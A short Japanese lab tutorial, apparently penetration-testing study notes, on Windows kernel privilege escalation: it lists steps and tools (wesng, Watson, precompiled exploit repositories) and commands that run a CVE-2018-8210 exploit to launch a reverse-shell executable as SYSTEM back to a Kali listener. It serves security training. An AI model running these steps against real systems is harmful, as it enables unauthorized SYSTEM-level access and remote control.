カーネルエクスプロイトの発見   
カーネルエクスプロイトの発見と使用は、通常、簡単なプロセスです。   
>1. Windowsのバージョンとパッチレベルを調べる(systeminfo)
>2. 一致するエクスプロイトを見つける（Google、ExploitDB、GitHub）   
>3. コンパイルして実行する

ただし、カーネルエクスプロイトは不安定な場合が多いので、注意が必要です。   
システムクラッシュを引き起こす可能性があります。   

### Tools  
Windows Exploit Suggester:https://github.com/bitsadmin/wesng   
Precompiled Kernel Exploits:https://github.com/SecWiki/windows-kernel-exploits   
Watson: https://github.com/rasta-mouse/Watson   

---
(注：この手順はWindows 7の場合です。）
1. systeminfo コマンドの出力を抽出します。    
```
> systeminfo > systeminfo.txt
```
2. 悪用される可能性のあるものを探すためにwesngを実行する。   
```
# /home/kali/.local/lib/python3.10/site-packages/wes.py systeminfo.txt -i 'Elevation of Privilege' --exploits-only | less
```
3. コンパイルされたエクスプロイトと結果をクロスリファレンスする。
https://github.com/SecWiki/windows-kernel-exploits   
4. CVE-2018-8210のコンパイル済みエクスプロイトをWindows VMにダウンロードする。   
5. Kali上でリスナーを起動し、exploitを実行します。   
リバースシェル実行ファイルを提供します。    
SYSTEM 権限で実行する必要があります。  
```
> .\x64.exe C:\PrivEsc\reverse.exe
````

